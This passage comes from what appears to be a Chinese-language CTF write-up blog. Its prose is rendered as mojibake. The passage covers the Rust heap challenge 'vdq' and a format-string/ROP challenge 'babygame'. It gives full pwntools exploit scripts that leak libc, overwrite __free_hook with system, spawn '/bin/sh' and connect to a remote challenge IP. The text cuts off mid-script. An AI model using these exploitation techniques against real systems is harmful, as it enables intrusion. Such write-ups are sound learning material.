class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><span class="hljs-comment"># pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="vdq"><a href="#vdq" class="headerlink" title="vdq"></a>vdq</h3><p>åˆæ˜¯ä¸€é“rustçš„é¢˜ï¼Œæµç¨‹å€’æ˜¯å¾ˆç®€å•ï¼Œget_opr_lstå‡½æ•°ä¸­æœ‰ä¸ª<code>serde_json::from_str</code>çš„ååºåˆ—åŒ–æ“ä½œï¼Œå¦‚æœååºåˆ—åŒ–çš„ç»“æœé”™è¯¯æ˜¯ä¼šç›´æ¥é€€å‡ºçš„ï¼Œè‡ªå·±å½“æ—¶ä¸ºäº†ææ¸…æ¥šrustçš„ååºåˆ—åŒ–è¿˜ä¸“é—¨ç¼–è¯‘ä¸€ä¸ªç¨‹åºï¼Œå†å»ç”¨è¯¥ç¨‹åºåœ¨idaä¸­åˆ†æã€‚</p><p>å½“æ—¶çš„æµ‹è¯•çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>name: <span class="hljs-type">String</span>,<br>    age: <span class="hljs-type">i32</span><br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">point</span> = Person &#123;name:<span class="hljs-string">&quot;aaaaa&quot;</span>.<span class="hljs-title function_ invoke__">to_owned</span>(), age:<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;point).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">point1</span>: Person = serde_json::<span class="hljs-title function_ invoke__">from_str</span>(&amp;json).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, point1);<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                       </p><p>å›åˆ°æœ¬é¢˜ä¸Šå»ï¼Œè¦æ±‚ååºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸€ä¸ª<code>Vec&lt;vdq::Operation&gt;</code>ï¼Œvdq::Operationæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼š</p><img src="/img/15/Screenshot 2023-07-06 162332.png" style="zoom:80%;" /><p>ææ¸…æ¥šä»¥åï¼Œæœ€åæµ‹è¯•ä¸€ä¸‹åºåˆ—åŒ–ä¼šå˜æˆå­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆå†…å®¹ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> serde::&#123;Serialize, Deserialize&#125;;<br><span class="hljs-meta">#[derive(Debug, Serialize, Deserialize)]</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Operation</span>&#123;<br>    Add,<br>    Remove,<br>    Append,<br>    Archive,<br>    View<br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">v</span>:<span class="hljs-type">Vec</span>&lt;Operation&gt; = <span class="hljs-built_in">vec!</span>[Operation::Add, Operation::Remove];<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">json</span>:<span class="hljs-type">String</span> = serde_json::<span class="hljs-title function_ invoke__">to_string</span>(&amp;v).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, json);<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                       </p><p><code>vdq::handle_opr_lst</code>å‡½æ•°å°±æ˜¯å°†ååºåˆ—åŒ–çš„ç»“æœå˜æˆä¸€ä¸ªä¸ªç±»ä¼¼äºå †èœå•çš„æ“ä½œï¼Œè‡ªå·±å½“æ—¶å®Œå…¨æ²¡æœ‰å‘ç°ä»»ä½•æ¼æ´ï¼Œç›´æ¥çœ‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« åæ‰çŸ¥é“è¿˜èƒ½ç›´æ¥ç”¨pythonå†™ä¸€ä¸ªfuzzè„šæœ¬ç›´æ¥å°†æ¼æ´æ‰¾å‡ºæ¥ï¼Œå…·ä½“ç»†èŠ‚å°±ç›´æ¥çœ‹æœ¬æ–‡å¼€å¤´æ¨èçš„æ–‡ç« å§ï¼Œè‡ªå·±å¤ç°æ—¶è¢«rustçš„å †åˆ†é…å¿«æŠ˜ç£¨ç–¯äº†ã€‚</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vdq&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./vdq&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>json_string = <span class="hljs-string">&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Add&quot;,&#x27;</span><br>json_string += <span class="hljs-string">&#x27;&quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Append&quot;&#x27;</span><br>json_string += <span class="hljs-string">&#x27;]&#x27;</span><br><span class="hljs-comment">#json_string = &#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Add&quot;]&#x27;</span><br><span class="hljs-comment"># json_string = b&#x27;&#x27;&#x27;[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Archive&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Append&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Archive&quot;, &quot;Add&quot;]&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;!&#x27;</span>, json_string)<br>p.sendline(<span class="hljs-string">b&#x27;$&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x410</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;:\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27; -&gt; &#x27;</span>)<br>leak = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    leak += (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>))<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">96</span><br>libc.address = libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">7</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x12</span> - <span class="hljs-number">8</span> * <span class="hljs-number">4</span>) + p64(<span class="hljs-number">0</span>))<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>å”¯ä¸€ä¸€ä¸ªè‡ªå·±æˆåŠŸå†™å‡ºæ¥çš„é¢˜ã€‚</p><p>è¿™é‡Œçš„å˜é‡v5å¯ä»¥ç›´æ¥è¢«åé¢çš„æº¢å‡ºè¦†ç›–ï¼Œè®©æ¥ä¸‹æ¥çš„æ¸¸æˆä¸­çš„éšæœºæ•°å˜æˆä¼ªéšæœºæ•°</p><img src="/img/15/Screenshot 2023-07-10 173013.png" style="zoom: 80%;" /><p>é¡ºåˆ©é€šè¿‡æ¸¸æˆåå°±æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†åªæœ‰ä¸€æ¬¡ï¼Œæ³„æ¼å‡ºç›¸å…³ä¿¡æ¯åè¿˜è¦æ”¹å˜è¿”å›åœ°å€ï¼Œæ‰€ä»¥éœ€è¦æ ˆä¸Šçš„ä¸€äº›ä¸è¿”å›åœ°å€è·ç¦»æ¯”è¾ƒè¿‘çš„æ ˆå€¼å»ä¿®æ”¹ï¼Œå½“ç„¶è¿™æœ‰1&#x2F;16çš„æœºç‡ä¿®æ”¹æˆåŠŸ</p><img src="/img/15/Screenshot 2023-07-10 164617.jpg" style="zoom:80%;" /><p>ä¿®æ”¹è¿”å›å€¼ä¸º0x153Eï¼Œå†æ¬¡ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåˆ©ç”¨ä¹‹å‰æ³„æ¼çš„ä¿¡æ¯å»æ”¹å˜è¿”å›åœ°å€ä¸ºä¸»å‡½æ•°ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºç›´æ¥ROPã€‚</p><p>å®Œæ•´exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babygame&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./babygame&#x27;, aslr=False)</span><br>p = remote(<span class="hljs-string">&#x27;112.74.186.148&#x27;</span>,<span class="hljs-number">49378</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span 